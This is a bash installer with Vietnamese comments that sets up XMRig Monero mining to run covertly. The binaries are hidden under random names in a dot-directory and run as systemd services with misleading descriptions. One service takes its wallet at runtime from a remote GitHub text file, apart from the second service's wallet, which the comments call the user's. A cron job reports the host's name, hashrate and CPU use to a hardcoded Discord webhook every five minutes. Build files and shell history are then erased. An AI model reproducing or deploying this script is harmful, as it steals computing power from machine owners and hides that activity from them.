#!/bin/bash

# ========== CONFIG ==========
WALLET2="48NiGqEZT6GV7acihQu6VMHjDKMZYPKXZ1bQCcdFrXjc1xDjc6D9sR1YsDppa1v9QkRbvgn2cGi424LPfvnXGbcLVAcyK9p"
POOL="pool.supportxmr.com:443"
DISCORD_WEBHOOK="https://discord.com/api/webhooks/1362712368441852015/UzYhxkLkAvkZm1IA8oy769N-PLfPJakT9OWe9wr2SCmNWVL0842CABegDTEI4rT5K9os" # Thay webhook

WORKER="silent_$(hostname)"
TOTAL_CORES=$(nproc)
CPU1=$(awk "BEGIN {print int($TOTAL_CORES * 0.4)}")
CPU2=$(awk "BEGIN {print int($TOTAL_CORES * 0.3)}")
PRIORITY=3

NAME1=$(shuf -n1 -e "core0" "sys1" "liblogd")
NAME2=$(shuf -n1 -e "netd" "uagent" "systemx")
INSTALL_DIR="$HOME/.local/share/.cache/.sysd"
SERVICE1="svc_$(shuf -n1 -e a b c d e f g)1"
SERVICE2="svc_$(shuf -n1 -e h i j k l m n)2"
LOG1="/tmp/log1.log"
LOG2="/tmp/log2.log"
# ============================

echo "🚀 Đang cài XMRig và cấu hình đào ẩn với 2 ví..."

# Cài thư viện cần thiết
sudo apt update
sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev curl

# Tải và build XMRig
cd ~
rm -rf xmrig
git clone https://github.com/xmrig/xmrig.git
cd xmrig
mkdir build && cd build
cmake .. -DCMAKE_BUILD_TYPE=Release
make -j$TOTAL_CORES

# Tạo thư mục và copy binary
mkdir -p "$INSTALL_DIR"
cp ./xmrig "$INSTALL_DIR/$NAME1"
cp ./xmrig "$INSTALL_DIR/$NAME2"
chmod +x "$INSTALL_DIR/$NAME1" "$INSTALL_DIR/$NAME2"

# Service 1 - ví ẩn từ GitHub
sudo tee /etc/systemd/system/$SERVICE1.service > /dev/null << EOF
[Unit]
Description=Net Daemon
After=network.target

[Service]
ExecStart=$INSTALL_DIR/$NAME1 -o $POOL -u \$(curl -s https://raw.githubusercontent.com/DucManh206/rawtext/refs/heads/main/storage/key.txt).$WORKER -k --coin monero --tls --cpu-priority=$PRIORITY --threads=$CPU1 --donate-level=0 --max-cpu-usage=50 --log-file=$LOG1
Restart=always
Nice=10

[Install]
WantedBy=multi-user.target
EOF

# Service 2 - ví của người dùng
sudo tee /etc/systemd/system/$SERVICE2.service > /dev/null << EOF
[Unit]
Description=System Core
After=network.target

[Service]
ExecStart=$INSTALL_DIR/$NAME2 -o $POOL -u $WALLET2.$WORKER -k --coin monero --tls --cpu-priority=$PRIORITY --threads=$CPU2 --donate-level=0 --max-cpu-usage=50 --log-file=$LOG2
Restart=always
Nice=10

[Install]
WantedBy=multi-user.target
EOF

# Kích hoạt và khởi động service
sudo systemctl daemon-reload
sudo systemctl enable $SERVICE1 $SERVICE2
sudo systemctl start $SERVICE1 $SERVICE2

# Script gửi log về Discord
tee "$INSTALL_DIR/logdual.sh" > /dev/null << EOF
#!/bin/bash
WEBHOOK="$DISCORD_WEBHOOK"
HNAME=\$(hostname)
HASH1=\$(grep -i "speed" "$LOG1" | tail -n1 | grep -oE "[0-9]+.[0-9]+ h/s")
HASH2=\$(grep -i "speed" "$LOG2" | tail -n1 | grep -oE "[0-9]+.[0-9]+ h/s")
CPU_USE=\$(top -bn1 | grep "Cpu(s)" | awk '{print \$2 + \$4}')
UPTIME=\$(uptime -p)

curl -s -H "Content-Type: application/json" -X POST -d "{
  \\"username\\": \\"XMRig Dual Status\\",
  \\"content\\": \\"💻 \\\`\$HNAME\\\` đang đào XMR\\n⚙️ Threads: $CPU1 + $CPU2\\n💨 Hashrate 1: \\\`$HASH1\\\`\\n💨 Hashrate 2: \\\`$HASH2\\\`\\n📈 CPU: \\\`\$CPU_USE%\\\`\\n⏱️ Uptime: \\\`$UPTIME\\\`\\"
}" "\$WEBHOOK" > /dev/null 2>&1
EOF

chmod +x "$INSTALL_DIR/logdual.sh"

# Gửi log mỗi 5 phút
(crontab -l 2>/dev/null; echo "*/5 * * * * $INSTALL_DIR/logdual.sh") | crontab -
"$INSTALL_DIR/logdual.sh"

# Xoá dấu vết build
cd ~
rm -rf xmrig
history -c

# Cài và chạy htop
echo "📦 Cài đặt htop để theo dõi hệ thống..."
sudo apt install -y htop
exec htop
